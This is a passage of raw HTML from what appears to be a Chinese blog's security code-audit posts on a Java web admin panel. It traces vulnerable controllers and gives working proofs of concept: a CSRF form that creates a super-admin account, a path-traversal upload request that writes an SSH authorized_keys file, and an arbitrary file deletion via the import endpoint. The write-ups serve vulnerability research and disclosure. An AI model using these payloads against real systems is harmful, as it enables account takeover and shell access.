class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含的字段。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>com&#x2F;cym&#x2F;utils&#x2F;EncodePassUtils.java#encode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String pass)</span> &#123;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(pass)) &#123;<br>pass = SecureUtil.md5(pass) + SecureUtil.md5(defaultPass);<br>&#125;<br><br><span class="hljs-keyword">return</span> pass;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encodeDefaultPass</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> SecureUtil.md5(defaultPass) + SecureUtil.md5(defaultPass);<br>&#125;<br></code></pre></td></tr></table></figure><p>这是pass生成算法。直接调用生成pass添加到Admin。</p><p>由于Admin类型我们可控，所以构建Admin类型的时候，我们传入id，name，pass，type，api即可，然后在写入数据库直接写入账号密码（默认不创建密码，且后续根据id修改密码，id不可控，是一个随机数），所以这里创建好Admin类型，进行csrf即可。</p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123035053907.png" alt="image-20231123035053907"></p><p>调用算法生成123456对应pass</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56e057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>ec<span class="hljs-number">7231</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>ecd<span class="hljs-number">7</span>fa<span class="hljs-number">89</span>fd<span class="hljs-number">6</span>bae<span class="hljs-number">6e81</span>d<span class="hljs-number">2</span>adc<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>构造csrf数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://10.0.0.67:8080/adminPage/admin/addOver&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;api&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;type&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parentId&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883ec7231c2ecd7fa89fd6bae6e81d2adc80&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>action改为对应的网址，name改为要创建的用户。</p><p>模拟admin用户在线，引导admin用户点击链接</p><p><img src="image-20231123035726533.png" alt="image-20231123035726533"></p><p>点击后成功创建用户</p><p><img src="image-20231123035814882.png" alt="image-20231123035814882"></p><p>成功登陆</p><p><img src="image-20231123040124874.png" alt="image-20231123040124874"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没办法，鉴权做的太好了，只能通过社工来进入后台，后台有命令执行功能点，没什么好审计rce的点，水几个垃圾洞好了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastcms代码审计</title>
    <link href="/2023/12/14/fastcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/14/fastcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传 (&lt;&#x3D;3.7.8)"></a>0x01 文件上传 (&lt;&#x3D;3.7.8)</h2><p>接口&#x2F;adminPage&#x2F;main&#x2F;upload</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;MainController.java#upload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;/adminPage/main/upload&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">upload</span><span class="hljs-params">(Context context, UploadedFile file)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(FileUtil.getTmpDir() + <span class="hljs-string">&quot;/&quot;</span> + file.getName());<br>file.transferTo(temp);<br><br><span class="hljs-keyword">return</span> renderSuccess(temp.getPath().replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (IllegalStateException | IOException e) &#123;<br>logger.error(e.getMessage(), e);<br>&#125;<br><br><span class="hljs-keyword">return</span> renderError();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越到ssh目录，也没有对后缀名限制，可以进行写公钥获取shell。然后把路径“\\”替换“&#x2F;”。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ssh-keygen -t rsa -f id_rsa</p><p>然后上传</p><p><img src="image-20231122173930609.png" alt="image-20231122173930609"></p><p>可以看到成功上传</p><p><img src="image-20231122174241618.png" alt="image-20231122174241618"></p><p>可以看到成功登陆。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>805<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZfrhKJObI9gpzcfk<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1677576503; _jpanonym=&quot;ZWMwM2YzYmEyY2ZiZDFhODVkODkwYmNkMGUxNzU2ZGUjMTY4MzE3NDg1Mzg5NyMzMTUzNjAwMCNZVEZoWWpFNU5XSmpaakE1TkRJek5UaGxNelF4WWprME5qa3lNekZqWkdJPQ==&quot;; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1683170841,1683202635; SOLONID=5ef99bb26ca845b5b3e528f215e802b4; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1700642329; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1700643843<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../../../../../../Users/username/.ssh/authorized_keys&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiI95LRyBLW2By5/KuuMm8QBicakTVsGcQGTjkhHTkn5wCkmC9j4Bt1IrM3AGuGZALe/FJMG3EFsnps2usFNgNaoC0qMJ7agjAbLt4BTC4sqlhKjzGEjTU3qvT1jqa/icjF5dOjA/<span class="hljs-number">0</span>B2o3h/<span class="hljs-number">0</span>M1kT6vcihSHELEcVYi13d8wUPqugd+<span class="hljs-number">5</span>uvZpy0giXQNdimZ6GnstBKL+GT9Pptf6ruLZVQvXvhDPMaeLD7/eU49MxVJG0LBBcXcppLYjrUPLVeqiq7kulIkfhHWQZpk4kUqjAtpLqNNhBupQaCekhaq9dJzPFRR6rV9SSAuytz2XEYqGrxm1ywIMd0rX6CsslQGCrPSyFk3zrY5knkOq908hyO6l2B+YPLf0CkmTbFv/RvQgIBDXUP5uWd8vfzjevXicIKNnHOIQR2PKM0bzPKKCkcH0sxpcuAHU+hL1qoX6J/<span class="hljs-number">2</span>HusfZWzifCYkna0iJewQLYT06MUYy1L7AD94SEVxCeZi1fFq/K3dnlvSp5uXv2jbdc= snake@snakedeMac-mini.loca</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x02-任意文件删除"><a href="#0x02-任意文件删除" class="headerlink" title="0x02 任意文件删除 (&lt;&#x3D;3.7.8)"></a>0x02 任意文件删除 (&lt;&#x3D;3.7.8)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;ExportController.java#dataImport()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(value = &quot;dataImport&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataImport</span><span class="hljs-params">(UploadedFile file, Context context)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>   <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(homeConfig.home + <span class="hljs-string">&quot;temp&quot;</span> + File.separator + file.getName());<br>      FileUtil.mkdir(tempFile.getParentFile());<br>      file.transferTo(tempFile);<br>      <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> FileUtil.readString(tempFile, StandardCharsets.UTF_8);<br>      tempFile.delete();<br><br>      <span class="hljs-type">AsycPack</span> <span class="hljs-variable">asycPack</span> <span class="hljs-operator">=</span> JSONUtil.toBean(json, AsycPack.class);<br>      confService.setAsycPack(asycPack);<br>      <br>      <span class="hljs-comment">// 导入证书</span><br>      <span class="hljs-keyword">if</span> (asycPack.getCertList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), Cert.class);<br>         sqlHelper.insertAll(asycPack.getCertList());<br>      &#125;<br>      <span class="hljs-keyword">if</span> (asycPack.getCertCodeList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), CertCode.class);<br>         sqlHelper.insertAll(asycPack.getCertCodeList());<br>      &#125;<br>      <br>      certService.writeAcmeZipBase64(asycPack.getAcmeZip());<br>   &#125;<br>   context.redirect(<span class="hljs-string">&quot;/adminPage/export?over=true&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越，也没有对后缀名限制，它先上传文件，然后从里面读，紧接着删除文件，只要控制传入文件名导致任意文件删除。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123002900589.png" alt="image-20231123002900589"></p><p>创建hookdd</p><p>构造数据包</p><p><img src="image-20231123002959116.png" alt="image-20231123002959116"></p><p><img src="image-20231123003017749.png" alt="image-20231123003017749"></p><p>完成删除</p><h2 id="0x03-Admin-注入绕过认证-全版本"><a href="#0x03-Admin-注入绕过认证-全版本" class="headerlink" title="0x03 Admin 注入绕过认证 (全版本)"></a>0x03 Admin 注入绕过认证 (全版本)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java#changePassOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;changePassOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><br>adminService.changePassOver(admin);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><span class="hljs-keyword">if</span> (admin.getAuth()) &#123;<br><span class="hljs-type">Admin</span> <span class="hljs-variable">adminOrg</span> <span class="hljs-operator">=</span> sqlHelper.findById(admin.getId(), Admin.class);<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(adminOrg.getKey())) &#123;<br>admin.setKey(authUtils.makeKey());<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setKey(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(admin.getPass())) &#123;<br>admin.setPass(EncodePassUtils.encode(admin.getPass()));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setPass(<span class="hljs-literal">null</span>);<br>&#125;<br>sqlHelper.updateById(admin);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里也是对admin.getId()判断，然后来改密码。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>以上两个路由都接收的Admin admin，</p><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 